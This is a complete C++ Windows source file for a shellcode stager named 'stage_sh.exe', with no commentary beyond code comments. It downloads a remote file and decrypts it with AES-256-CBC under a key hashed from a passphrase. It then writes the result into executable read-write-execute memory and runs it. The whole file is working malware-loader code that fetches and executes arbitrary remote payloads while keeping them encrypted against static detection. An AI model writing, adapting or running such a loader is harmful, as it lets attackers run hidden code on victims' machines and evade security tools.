#include <windows.h>
#include <wininet.h>
#include <bcrypt.h>
#include <vector>
#include <string>
#include <iostream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")

// Manual PKCS7 unpad function
DWORD unpad_pkcs7(BYTE* data, DWORD len) {
    if (len == 0) return 0;
    BYTE pad_value = data[len - 1];
    if (pad_value == 0 || pad_value > 16) return 0;  // Invalid padding
    for (DWORD i = 1; i < pad_value; ++i) {
        if (data[len - i - 1] != pad_value) return 0;  // Invalid
    }
    return len - pad_value;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: stage_sh.exe <url_to_outputfile.bin> <key_to_encrypt>" << std::endl;
        return 1;
    }

    std::string url = argv[1];
    std::string key_str = argv[2];

    // Replace \ with / for URL
    for (char& c : url) {
        if (c == '\\') c = '/';
    }

    // Prepend http:// if not present
    std::string full_url = (url.find("http://") == 0 || url.find("https://") == 0) ? url : "http://" + url;

    // Download the file
    HINTERNET hInternet = InternetOpenA("Stager", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, full_url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    std::vector<BYTE> data;
    BYTE buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        data.insert(data.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (data.size() < 16) {
        std::cerr << "Downloaded data too small" << std::endl;
        return 1;
    }

    // Derive key using SHA-256
    BCRYPT_ALG_HANDLE hShaAlg;
    BCryptOpenAlgorithmProvider(&hShaAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);

    BCRYPT_HASH_HANDLE hHash;
    BCryptCreateHash(hShaAlg, &hHash, NULL, 0, NULL, 0, 0);

    BCryptHashData(hHash, reinterpret_cast<PUCHAR>(key_str.data()), static_cast<DWORD>(key_str.size()), 0);

    BYTE key[32];
    BCryptFinishHash(hHash, key, 32, 0);

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hShaAlg, 0);

    // Setup AES-256-CBC
    BCRYPT_ALG_HANDLE hAesAlg;
    BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, reinterpret_cast<PUCHAR>(BCRYPT_CHAIN_MODE_CBC), sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    DWORD keyObjectLen;
    DWORD dataLen;
    BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, reinterpret_cast<PUCHAR>(&keyObjectLen), sizeof(DWORD), &dataLen, 0);

    std::vector<BYTE> keyObject(keyObjectLen);
    BCRYPT_KEY_HANDLE hKey;
    BCryptGenerateSymmetricKey(hAesAlg, &hKey, keyObject.data(), keyObjectLen, key, 32, 0);

    // Extract IV and ciphertext
    BYTE* iv = data.data();
    BYTE* ciphertext = data.data() + 16;
    DWORD ciphertextLen = static_cast<DWORD>(data.size()) - 16;

    // Decrypt (BCryptDecrypt requires two calls: one for size, one for data)
    DWORD decryptedLen = 0;
    NTSTATUS status = BCryptDecrypt(hKey, ciphertext, ciphertextLen, NULL, iv, 16, NULL, 0, &decryptedLen, BCRYPT_PAD_NONE);
    if (status != 0) {
        std::cerr << "Decrypt size failed" << std::endl;
        return 1;
    }

    std::vector<BYTE> decrypted(decryptedLen);
    status = BCryptDecrypt(hKey, ciphertext, ciphertextLen, NULL, iv, 16, decrypted.data(), decryptedLen, &decryptedLen, BCRYPT_PAD_NONE);
    if (status != 0) {
        std::cerr << "Decrypt failed" << std::endl;
        return 1;
    }

    // Unpad PKCS7
    DWORD unpaddedLen = unpad_pkcs7(decrypted.data(), decryptedLen);
    if (unpaddedLen == 0) {
        std::cerr << "Unpadding failed" << std::endl;
        return 1;
    }

    // Allocate executable memory and execute shellcode
    void* execMem = VirtualAlloc(NULL, unpaddedLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "Memory allocation failed" << std::endl;
        return 1;
    }

    memcpy(execMem, decrypted.data(), unpaddedLen);
    ((void(*)())execMem)();

    // Cleanup
    VirtualFree(execMem, 0, MEM_RELEASE);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAesAlg, 0);

    return 0;
}
